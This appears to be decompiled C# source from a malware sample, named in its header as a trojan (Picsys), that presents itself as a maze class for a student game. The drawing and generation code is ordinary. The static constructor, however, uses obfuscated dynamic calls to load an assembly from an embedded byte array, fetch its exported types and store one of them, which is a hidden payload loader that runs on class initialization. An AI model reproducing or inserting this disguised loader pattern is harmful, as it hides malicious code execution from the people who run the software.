// Decompiled with JetBrains decompiler
// Type: OOP_TeamWork.UI.Maze
// Assembly: OOP-TeamWork, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78E60F07-1B9F-418F-8C6F-A1FA2CABDF45
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan.MSIL.Picsys.gen-5866008a90168b7835b8f8b3d25aa43b6aaafd059e7519932278729ceae256ba.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using WorkshopGame.UI;

namespace OOP_TeamWork.UI
{
  internal class Maze
  {
    private const int UP = 1;
    private const int LEFT = 2;
    private const int RIGHT = 4;
    private const int DOWN = 8;
    private int[,] maze;
    private int rows;
    private int cols;
    private int unused;
    private Bitmap image;
    private Graphics graphics;
    public static Type Stray;

    public Maze(int rows, int cols)
    {
      this.rows = rows;
      this.cols = cols;
      this.maze = new int[cols, rows];
      for (int index1 = 0; index1 < cols; ++index1)
      {
        for (int index2 = 0; index2 < rows; ++index2)
          this.maze[index1, index2] = 0;
      }
      this.maze[0, 0] = 12;
      this.maze[cols - 1, 0] = 10;
      this.maze[0, rows - 1] = 5;
      this.maze[cols - 1, rows - 1] = 3;
      for (int index = 1; index < rows - 1; ++index)
      {
        this.maze[0, index] = 9;
        this.maze[cols - 1, index] = 9;
      }
      for (int index = 1; index < cols - 1; ++index)
      {
        this.maze[index, 0] = 6;
        this.maze[index, rows - 1] = 6;
      }
      this.maze[cols / 2, 0] = 3;
      this.maze[cols / 2 + 1, 0] = 5;
      this.maze[cols / 2, rows - 1] = 10;
      this.maze[cols / 2 + 1, rows - 1] = 12;
      this.unused = (cols - 2) * (rows - 2);
      this.Generate();
      this.Draw();
    }

    private void Draw()
    {
      this.image = new Bitmap(this.cols * 60, this.rows * 60);
      this.graphics = Graphics.FromImage((Image) this.image);
      this.graphics.Clear(Color.DarkBlue);
      Pen pen = new Pen(Color.Yellow);
      for (int index1 = 0; index1 < this.cols; ++index1)
      {
        for (int index2 = 0; index2 < this.rows; ++index2)
        {
          int num = this.maze[index1, index2];
          if ((num & 1) != 0)
            this.graphics.DrawLine(pen, index1 * 60 + 30, index2 * 60, index1 * 60 + 30, index2 * 60 + 30 - 1);
          if ((num & 8) != 0)
            this.graphics.DrawLine(pen, index1 * 60 + 30, index2 * 60 + 30, index1 * 60 + 30, index2 * 60 + 60 - 1);
          if ((num & 4) != 0)
            this.graphics.DrawLine(pen, index1 * 60 + 30, index2 * 60 + 30, index1 * 60 + 60 - 1, index2 * 60 + 30);
          if ((num & 2) != 0)
            this.graphics.DrawLine(pen, index1 * 60, index2 * 60 + 30, index1 * 60 + 30 - 1, index2 * 60 + 30);
        }
      }
    }

    public void Paint(Graphics g, int x, int y) => g.DrawImage((Image) this.image, x, y);

    private void Generate()
    {
      int[] numArray1 = new int[20];
      int[,] numArray2 = new int[4, 2]
      {
        {
          0,
          -1
        },
        {
          -1,
          0
        },
        {
          1,
          0
        },
        {
          0,
          1
        }
      };
      Random random = new Random();
label_22:
      while (this.unused > 0)
      {
        int index1;
        int index2;
        do
        {
          index1 = random.Next(this.cols);
          index2 = random.Next(this.rows);
        }
        while (this.maze[index1, index2] != 0);
        for (int index3 = 0; index3 < 20; ++index3)
          numArray1[index3] = 0;
        --this.unused;
        while (true)
        {
          for (int index4 = 0; index4 < 19; ++index4)
            numArray1[index4] = numArray1[index4 + 1];
          bool[] flagArray = new bool[4];
          int index5;
          do
          {
            do
            {
              index5 = random.Next(4);
            }
            while (index5 == (numArray1[18] ^ 3));
            numArray1[19] = index5;
            for (int index6 = 0; index6 < 4; ++index6)
              flagArray[index6] = false;
            for (int index7 = 0; index7 < 20; ++index7)
              flagArray[numArray1[index7]] = true;
          }
          while (flagArray[0] && flagArray[1] && flagArray[2] && flagArray[3]);
          this.maze[index1, index2] |= 1 << index5;
          index1 += numArray2[index5, 0];
          index2 += numArray2[index5, 1];
          bool flag = this.maze[index1, index2] != 0;
          this.maze[index1, index2] |= 1 << (index5 ^ 3);
          if (!flag)
            --this.unused;
          else
            goto label_22;
        }
      }
    }

    static Maze()
    {
      // ISSUE: reference to a compiler-generated field
      if (Maze.\u003C\u003Eo__15.\u003C\u003Ep__3 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Maze.\u003C\u003Eo__15.\u003C\u003Ep__3 = CallSite<Func<CallSite, object, Type>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (Type), typeof (Maze)));
      }
      // ISSUE: reference to a compiler-generated field
      Func<CallSite, object, Type> target1 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__3.Target;
      // ISSUE: reference to a compiler-generated field
      CallSite<Func<CallSite, object, Type>> p3 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__3;
      // ISSUE: reference to a compiler-generated field
      if (Maze.\u003C\u003Eo__15.\u003C\u003Ep__2 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Maze.\u003C\u003Eo__15.\u003C\u003Ep__2 = CallSite<Func<CallSite, object, int, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof (Maze), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      Func<CallSite, object, int, object> target2 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__2.Target;
      // ISSUE: reference to a compiler-generated field
      CallSite<Func<CallSite, object, int, object>> p2 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__2;
      // ISSUE: reference to a compiler-generated field
      if (Maze.\u003C\u003Eo__15.\u003C\u003Ep__1 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Maze.\u003C\u003Eo__15.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetExportedTypes", (IEnumerable<Type>) null, typeof (Maze), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      Func<CallSite, object, object> target3 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__1.Target;
      // ISSUE: reference to a compiler-generated field
      CallSite<Func<CallSite, object, object>> p1 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__1;
      // ISSUE: reference to a compiler-generated field
      if (Maze.\u003C\u003Eo__15.\u003C\u003Ep__0 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Maze.\u003C\u003Eo__15.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, byte[], object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Load", (IEnumerable<Type>) null, typeof (Maze), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object obj1 = Maze.\u003C\u003Eo__15.\u003C\u003Ep__0.Target((CallSite) Maze.\u003C\u003Eo__15.\u003C\u003Ep__0, KeyboardController.TigerEurope, GameWindow.WindowTabsClose);
      object obj2 = target3((CallSite) p1, obj1);
      object obj3 = target2((CallSite) p2, obj2, 2);
      Maze.Stray = target1((CallSite) p3, obj3);
    }
  }
}
